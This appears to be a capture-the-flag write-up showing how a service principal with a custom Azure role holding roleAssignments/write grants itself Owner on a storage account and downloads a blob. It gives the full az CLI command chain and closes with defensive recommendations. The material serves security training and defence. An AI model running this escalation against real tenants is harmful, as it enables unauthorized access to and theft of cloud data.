# Azure Service Principal Privilege Escalation to Storage Account

## Challenge Overview

### Objective

The objective of this challenge was to use the provided Azure Service Principal credentials to identify an Entra ID / Azure RBAC misconfiguration, escalate the Service Principal's privileges, and access sensitive data stored in an Azure Storage Account.

### Scenario

The challenge provides a Client ID and Client Secret belonging to an Azure Service Principal. The Service Principal initially does not have direct access to the target resources.

The investigation focuses on enumerating the Service Principal's Azure RBAC permissions and identifying an overly privileged custom role that allows modification of role assignments.

This permission can be abused to assign a higher-privileged role to the Service Principal at the Storage Account scope.

### Skills Practiced

* Azure Service Principal authentication
* Azure RBAC enumeration
* Custom role analysis
* Azure privilege escalation through `roleAssignments/write`
* Azure Storage enumeration
* Blob data retrieval

---

# Environment

## Cloud Provider

Azure

## Initial Access

The challenge provides:

* Client ID
* Client Secret
* Organization domain

The Tenant ID was required to authenticate the Service Principal.

The Client Secret is intentionally omitted from this report.

## Available Tools

* Azure CLI (`az`)
* Azure Portal
* Entra ID / Microsoft Graph
* Azure Storage CLI commands

---

# Attack Methodology

## Initial Hypothesis

The initial hypothesis was that the provided Service Principal had an excessive Azure RBAC permission that could be abused to gain access to a restricted Storage Account.

Expected targets:

* Service Principal permissions
* Custom Azure RBAC roles
* `Microsoft.Authorization/roleAssignments/write`
* Target Storage Account
* Blob containers and files

The key privilege escalation condition was the ability to create or modify role assignments within the scope of the target Storage Account.

---

# Attack Workflow

The attack was performed by authenticating as the provided Service Principal, enumerating its permissions, identifying the privilege escalation permission, assigning a higher-privileged role, and accessing the target Storage Account.

## Step 1 - Discover the Tenant ID

### Goal

The Azure Service Principal requires a Tenant ID in addition to the Client ID and Client Secret.

The organization domain provided by the challenge was:

```text
secure-corp.org
```

The Tenant ID was identified as:

```text
f2a33211-e46a-4c92-b84d-aff06c2cd13f
```

Observation:

The Tenant ID identifies the Microsoft Entra ID tenant in which the Service Principal is registered.

---

## Step 2 - Initial Access Validation

### Action

Authenticate to Azure using the provided Service Principal credentials.

Command:

```powershell
az login --service-principal `
  --username "5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f" `
  --password "<CLIENT_SECRET>" `
  --tenant "f2a33211-e46a-4c92-b84d-aff06c2cd13f"
```

Result:

```text
Name    CloudName    SubscriptionId                        TenantId
------  -----------  ------------------------------------  ------------------------------------
Prod    AzureCloud   662a4fee-a3ba-49b3-9caf-8c20ed04503f  f2a33211-e46a-4c92-b84d-aff06c2cd13f
```

Observation:

Authentication was successful and the Service Principal gained an authenticated Azure CLI session.

The active subscription was:

```text
662a4fee-a3ba-49b3-9caf-8c20ed04503f
```

---

## Step 3 - Enumerate the Service Principal

### Goal

Identify the Service Principal and determine what Azure RBAC permissions are assigned to it.

Command:

```powershell
az ad sp show --id "5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f"
```

Important findings:

```text
appDisplayName: secops-testing-mgmt-sp
appId:          5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f
id:             0fdb55da-f3c4-4cf9-8e0d-3037e0b305d0
```

The Service Principal was identified as:

```text
secops-testing-mgmt-sp
```

---

## Step 4 - Identify the Privilege Escalation Path

### Goal

Enumerate all Azure RBAC assignments associated with the Service Principal.

Command:

```powershell
az role assignment list `
  --assignee "5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f" `
  --all `
  -o table
```

The important assignment was the custom role:

```text
secops-testing-mgmt-sp-role
```

assigned at the Storage Account scope:

```text
/subscriptions/662a4fee-a3ba-49b3-9caf-8c20ed04503f/resourceGroups/Secops-Testing-rg/providers/Microsoft.Storage/storageAccounts/secopstestingtoolsacc
```

The custom role was then inspected:

```powershell
az role definition list `
  --name "StorageAccountRoleAssignmentRole" `
  --query "[].{RoleName:roleName, Permissions:permissions}" `
  --output json
```

### Misconfiguration Identified

The custom role included:

```text
Microsoft.Authorization/roleAssignments/write
```

This permission allows the principal to create role assignments within the permitted scope.

Therefore, the Service Principal could assign a more privileged Azure RBAC role to itself at the target Storage Account scope.

This was the privilege escalation gateway.

---

## Step 5 - Privilege Escalation

### Target Scope

The target Storage Account was:

```text
secopstestingtoolsacc
```

with the following scope:

```text
/subscriptions/662a4fee-a3ba-49b3-9caf-8c20ed04503f/resourceGroups/Secops-Testing-rg/providers/Microsoft.Storage/storageAccounts/secopstestingtoolsacc
```

### Action

Assign the `Owner` role to the Service Principal at the Storage Account scope.

Command:

```powershell
az role assignment create `
  --assignee "5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f" `
  --role "Owner" `
  --scope "/subscriptions/662a4fee-a3ba-49b3-9caf-8c20ed04503f/resourceGroups/Secops-Testing-rg/providers/Microsoft.Storage/storageAccounts/secopstestingtoolsacc"
```

Result:

The Service Principal gained `Owner` permissions at the target Storage Account scope.

The resulting privilege level was sufficient to control the target Storage Account and access its contents.

---

## Step 6 - Enumerate the Storage Account

### Goal

Identify the available Blob containers.

Command:

```powershell
az storage container list `
  --account-name secopstestingtoolsacc `
  --auth-mode login `
  -o table
```

Result:

```text
Name
-------------------------
secopstestingtoolscont
```

The target container was:

```text
secopstestingtoolscont
```

---

## Step 7 - Enumerate Blobs

### Goal

Identify files stored in the target container.

Command:

```powershell
az storage blob list `
  --account-name secopstestingtoolsacc `
  --container-name secopstestingtoolscont `
  --auth-mode login `
  -o table
```

Result:

```text
Name      Blob Type    Blob Tier    Length    Content Type
--------  -----------  -----------  --------  --------------
test.txt  BlockBlob    Hot          293       text/plain
```

The container contained the following Blob:

```text
test.txt
```

---

## Step 8 - Retrieve the Sensitive Data

### Action

Download the Blob from Azure Storage.

Command:

```powershell
az storage blob download `
  --account-name secopstestingtoolsacc `
  --container-name secopstestingtoolscont `
  --name test.txt `
  --file .\test.txt `
  --auth-mode login
```

The downloaded file could then be inspected locally:

```powershell
Get-Content .\test.txt
```

The contents of the Blob contained the challenge's sensitive information / flag.

---

# Attack Chain

```text
Initial Service Principal Credentials
                |
                v
        Azure Authentication
                |
                v
     Service Principal Enumeration
                |
                v
     Custom RBAC Role Identified
                |
                v
 Microsoft.Authorization/roleAssignments/write
                |
                v
     Assign Owner to Service Principal
                |
                v
      Storage Account Access
                |
                v
       Container Enumeration
                |
                v
          Blob Enumeration
                |
                v
       Sensitive Data Retrieval
```

---

# Findings

## Security Weakness

The primary security weakness was an overly permissive custom Azure RBAC role assigned to the Service Principal.

The role allowed:

```text
Microsoft.Authorization/roleAssignments/write
```

at the Storage Account scope.

This effectively allowed the Service Principal to modify authorization on the target resource and grant itself a higher-privileged role.

The combination of:

```text
roleAssignments/write
```

and a sensitive resource scope created a direct privilege escalation path.

## Impact

An attacker who obtains the Service Principal credentials could:

* Authenticate to the Azure tenant.
* Enumerate its RBAC permissions.
* Create a privileged role assignment.
* Escalate its permissions on the target Storage Account.
* Enumerate Blob containers.
* Access stored files and sensitive data.

This demonstrates how a seemingly limited Service Principal can become highly privileged when `Microsoft.Authorization/roleAssignments/write` is granted at an overly broad or sensitive scope.

---

# Evidence

Important commands and outputs:

```powershell
az login --service-principal `
  --username "5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f" `
  --password "<CLIENT_SECRET>" `
  --tenant "f2a33211-e46a-4c92-b84d-aff06c2cd13f"
```

```powershell
az role assignment list `
  --assignee "5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f" `
  --all `
  -o table
```

Relevant role:

```text
secops-testing-mgmt-sp-role
```

Target scope:

```text
/subscriptions/662a4fee-a3ba-49b3-9caf-8c20ed04503f/resourceGroups/Secops-Testing-rg/providers/Microsoft.Storage/storageAccounts/secopstestingtoolsacc
```

Privilege escalation permission:

```text
Microsoft.Authorization/roleAssignments/write
```

Target Storage Account:

```text
secopstestingtoolsacc
```

Target container:

```text
secopstestingtoolscont
```

Target Blob:

```text
test.txt
```

---

# Defensive Recommendations

* Apply the principle of least privilege to Service Principals.
* Avoid granting `Microsoft.Authorization/roleAssignments/write` unless it is explicitly required.
* Avoid assigning authorization-management permissions directly on sensitive resources.
* Use narrowly scoped custom roles instead of broad authorization-management permissions.
* Regularly review Service Principal role assignments.
* Monitor creation and modification of Azure RBAC role assignments.
* Monitor Service Principal authentication and unusual privilege escalation activity.
* Review and rotate Service Principal secrets regularly.
* Prefer managed identities where appropriate to reduce the exposure of long-lived client secrets.
* Separate resource management privileges from authorization-management privileges.

---

# Key Takeaways

* A Service Principal can be a powerful attack entry point when its client credentials are compromised.
* Azure RBAC permissions must be evaluated based on the actions they allow, not only the role name.
* `Microsoft.Authorization/roleAssignments/write` can provide a direct privilege escalation path when granted at a sensitive scope.
* The scope of an RBAC assignment is critical: a dangerous permission limited to a resource can still provide complete control over that resource.
* After privilege escalation, Azure Storage can be enumerated using `az storage` commands with `--auth-mode login`.
* Cloud privilege escalation often results from the combination of a legitimate permission and an overly permissive scope.

---

# References

* Microsoft Azure RBAC documentation
* Microsoft Entra ID Service Principal documentation
* Azure Storage Blob documentation
* Azure CLI documentation
